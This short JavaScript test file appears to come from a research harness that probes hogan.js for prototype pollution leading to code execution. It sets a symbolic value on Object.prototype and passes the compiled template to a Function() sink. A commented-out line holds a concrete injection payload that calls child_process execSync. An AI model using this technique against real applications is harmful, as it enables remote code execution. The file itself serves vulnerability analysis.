const hogan = require("hogan.js");
var S$ = require('../../../lib/S$')


/* Polluted Payload*/
// inject property to root prototype
// Object.prototype.asString = '1';
// Object.prototype.name = '2';
// Object.prototype.inject = "},flag:process.mainModule.require(`child_process`).execSync(`touch ./attack.txt`).toString()}}//"

// Object.prototype.asString = '1';
// Object.prototype.name = '2';
Object.prototype.inject = S$.pureSymbol('inject_undef');


/* Exported Function Call*/
const TEMPLATE = `
<p1>Template</p1>
`;
const template = hogan.compile(TEMPLATE);

//pp2rce sink
Function(`return ${template}`)();